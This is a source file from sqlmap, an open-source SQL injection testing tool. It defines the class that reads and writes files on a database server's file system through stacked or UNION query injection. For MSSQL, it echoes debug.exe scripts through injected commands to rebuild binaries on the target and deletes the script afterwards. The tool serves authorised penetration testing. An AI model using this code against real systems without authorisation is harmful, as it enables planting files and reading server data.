#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import binascii
import codecs
import os

from lib.core.agent import agent
from lib.core.common import dataToOutFile
from lib.core.common import backend
from lib.core.common import isTechniqueAvailable
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.enums import PAYLOAD
from lib.core.exception import sqlmapUndefinedMethod
from lib.request import inject

class Filesystem:
    """
    This class defines generic OS file system functionalities for plugins.
    """

    def __init__(self):
        self.fileTblName = "sqlmapfile"
        self.tblField    = "data"

    def __unbase64String(self, base64Str):
        unbase64Str = "%s\n" % base64Str.decode("base64")

        return unbase64Str

    def __unhexString(self, hexStr):
        if len(hexStr) % 2 != 0:
            errMsg  = "for some reason(s) sqlmap retrieved an odd-length "
            errMsg += "hexadecimal string which it is not able to convert "
            errMsg += "to raw string"
            logger.error(errMsg)

            return hexStr

        return binascii.unhexlify(hexStr)

    def __binDataToScr(self, binaryData, chunkName):
        """
        Called by Microsoft SQL Server plugin to write a binary file on the
        back-end DBMS underlying file system
        """

        fileLines = []
        fileSize  = len(binaryData)
        lineAddr  = 0x100
        lineLen   = 20

        fileLines.append("n %s" % chunkName)
        fileLines.append("rcx")
        fileLines.append("%x" % fileSize)
        fileLines.append("f 0100 %x 00" % fileSize)

        for fileLine in range(0, len(binaryData), lineLen):
            scrString = ""

            for lineChar in binaryData[fileLine:fileLine+lineLen]:
                strLineChar = binascii.hexlify(lineChar)

                if not scrString:
                    scrString  = "e %x %s" % (lineAddr, strLineChar)
                else:
                    scrString += " %s" % strLineChar

                lineAddr += len(lineChar)

            fileLines.append(scrString)

        fileLines.append("w")
        fileLines.append("q")

        return fileLines

    def __checkWrittenFile(self, wFile, dFile, fileType):
        if backend.getIdentifiedDbms() == DBMS.MYSQL:
            lengthQuery = "SELECT LENGTH(LOAD_FILE('%s'))" % dFile

        elif backend.getIdentifiedDbms() == DBMS.PGSQL:
            lengthQuery = "SELECT LENGTH(data) FROM pg_largeobject WHERE loid=%d" % self.oid

        elif backend.getIdentifiedDbms() == DBMS.MSSQL:
            self.createSupportTbl(self.fileTblName, self.tblField, "text")

            # Reference: http://msdn.microsoft.com/en-us/library/ms188365.aspx
            inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (self.fileTblName, dFile, randomStr(10), randomStr(10)))

            lengthQuery = "SELECT DATALENGTH(%s) FROM %s" % (self.tblField, self.fileTblName)

        wFileSize = os.path.getsize(wFile)

        logger.debug("checking if the %s file has been written" % fileType)
        dFileSize = inject.getValue(lengthQuery, resumeValue=False, charsetType=2)

        if dFileSize and dFileSize.isdigit():
            infoMsg  = "the file has been successfully written and "
            infoMsg += "its size is %s bytes" % dFileSize

            dFileSize = long(dFileSize)

            if wFileSize == dFileSize:
                infoMsg += ", same size as the local file '%s'" % wFile
            else:
                infoMsg += ", but the size differs from the local "
                infoMsg += " file '%s' (%d bytes)" % (wFile, wFileSize)

            logger.info(infoMsg)
        else:
            warnMsg  = "it looks like the file has not been written, this "
            warnMsg += "can occur if the DBMS process' user has no write "
            warnMsg += "privileges in the destination path"
            logger.warn(warnMsg)

    def fileToSqlQueries(self, fcEncodedList):
        """
        Called by MySQL and PostgreSQL plugins to write a file on the
        back-end DBMS underlying file system
        """

        counter    = 0
        sqlQueries = []

        for fcEncodedLine in fcEncodedList:
            if counter == 0:
                sqlQueries.append("INSERT INTO %s(%s) VALUES (%s)" % (self.fileTblName, self.tblField, fcEncodedLine))
            else:
                updatedField = agent.simpleConcatQuery(self.tblField, fcEncodedLine)
                sqlQueries.append("UPDATE %s SET %s=%s" % (self.fileTblName, self.tblField, updatedField))

            counter += 1

        return sqlQueries

    def fileEncode(self, fileName, encoding, single):
        """
        Called by MySQL and PostgreSQL plugins to write a file on the
        back-end DBMS underlying file system
        """

        fcEncodedList = []
        fp = codecs.open(fileName, "rb")
        fcEncodedStr = fp.read().encode(encoding).replace("\n", "")

        if not single:
            fcLength = len(fcEncodedStr)

            if fcLength > 1024:
                for i in range(0, fcLength, 1024):
                    string = ""

                    if encoding == "hex":
                        string += "0x"

                    string += fcEncodedStr[i:i+1024]

                    if encoding == "base64":
                        string = "'%s'" % string

                    fcEncodedList.append(string)

        if not fcEncodedList:
            if encoding == "hex":
                fcEncodedStr = "0x%s" % fcEncodedStr
            elif encoding == "base64":
                fcEncodedStr = "'%s'" % fcEncodedStr

            fcEncodedList = [ fcEncodedStr ]

        return fcEncodedList

    def updateBinChunk(self, binaryData, tmpPath):
        """
        Called by Microsoft SQL Server plugin to write a binary file on the
        back-end DBMS underlying file system
        """

        randScr        = "tmpf%s.scr" % randomStr(lowercase=True)
        chunkName      = randomStr(lowercase=True)
        fileScrLines   = self.__binDataToScr(binaryData, chunkName)
        forgedScrLines = []
        cmd            = ""
        charCounter    = 0
        maxLen         = 512

        logger.debug("generating binary file %s\%s, please wait.." % (tmpPath, chunkName))

        for scrLine in fileScrLines:
            forgedScrLine  = "echo %s " % scrLine
            forgedScrLine += ">> \"%s\%s\"" % (tmpPath, randScr)
            forgedScrLines.append(forgedScrLine)

        for forgedScrLine in forgedScrLines:
            cmd         += "%s & " % forgedScrLine
            charCounter += len(forgedScrLine)

            if charCounter >= maxLen:
                self.execCmd(cmd)

                cmd = ""
                charCounter = 0

        if cmd:
            self.execCmd(cmd)

        commands = ( "cd %s" % tmpPath, "debug < %s" % randScr, "del /F /Q %s" % randScr )
        complComm = " & ".join(command for command in commands)

        self.execCmd(complComm, silent=True)

        return chunkName

    def askCheckWrittenFile(self, wFile, dFile, fileType):
        message  = "do you want confirmation that the file '%s' " % dFile
        message += "has been successfully written on the back-end DBMS "
        message += "file system? [Y/n] "
        output   = readInput(message, default="Y")

        if not output or output in ("y", "Y"):
            self.__checkWrittenFile(wFile, dFile, fileType)

    def unionReadFile(self, rFile):
        errMsg  = "'unionReadFile' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise sqlmapUndefinedMethod, errMsg

    def stackedReadFile(self, rFile):
        errMsg  = "'stackedReadFile' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise sqlmapUndefinedMethod, errMsg

    def unionWriteFile(self, wFile, dFile, fileType, confirm=True):
        errMsg  = "'unionWriteFile' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise sqlmapUndefinedMethod, errMsg

    def stackedWriteFile(self, wFile, dFile, fileType, confirm=True):
        errMsg  = "'stackedWriteFile' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise sqlmapUndefinedMethod, errMsg

    def readFile(self, rFile):
        fileContent = None

        self.checkDbmsOs()

        if conf.direct or isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED):
            if isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED):
                debugMsg  = "going to read the file with stacked query SQL "
                debugMsg += "injection technique"
                logger.debug(debugMsg)

            fileContent = self.stackedReadFile(rFile)
        else:
            debugMsg  = "going to read the file with UNION query SQL "
            debugMsg += "injection technique"
            logger.debug(debugMsg)

            fileContent = self.unionReadFile(rFile)

        if fileContent in ( None, "" ) and backend.getIdentifiedDbms() != DBMS.PGSQL:
            self.cleanup(onlyFileTbl=True)

            return
        elif isinstance(fileContent, (list, tuple, set)):
            newFileContent = ""

            for chunk in fileContent:
                if isinstance(chunk, (list, tuple, set)):
                    chunk = chunk[0]

                newFileContent += chunk

            fileContent = newFileContent

        fileContent = self.__unhexString(fileContent)
        rFilePath = dataToOutFile(fileContent)

        if backend.getIdentifiedDbms() != DBMS.PGSQL:
            self.cleanup(onlyFileTbl=True)

        return rFilePath

    def writeFile(self, wFile, dFile, fileType=None, confirm=True):
        self.checkDbmsOs()

        if conf.direct or isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED):
            if isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED):
                debugMsg  = "going to upload the %s file with " % fileType
                debugMsg += "stacked query SQL injection technique"
                logger.debug(debugMsg)

            self.stackedWriteFile(wFile, dFile, fileType, confirm)
            self.cleanup(onlyFileTbl=True)
        else:
            debugMsg  = "going to upload the %s file with " % fileType
            debugMsg += "UNION query SQL injection technique"
            logger.debug(debugMsg)

            self.unionWriteFile(wFile, dFile, fileType, confirm)
